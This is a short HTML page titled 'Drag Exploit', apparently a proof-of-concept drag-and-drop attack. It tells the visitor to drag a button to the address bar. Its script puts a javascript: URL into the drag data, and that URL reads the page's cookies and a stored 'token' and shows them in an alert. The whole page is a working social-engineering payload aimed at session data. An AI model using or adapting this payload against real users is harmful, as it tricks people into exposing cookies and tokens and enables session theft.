<!DOCTYPE html>
<html>
<head>
  <title>Drag Exploit</title>
</head>
<body>

<h2>Drag this to the address bar 👇</h2>

<a draggable="true" id="exploit" style="padding:10px;background:red;color:white;cursor:grab;">
  Drag Me
</a>

<script>
document.getElementById('exploit').ondragstart = function(e) {
  e.dataTransfer.setData(
    'text/plain',
    "javascript:alert('Cookie: '+document.cookie+' | Token: '+localStorage.getItem('token'))"
  );
};
</script>

</body>
</html>
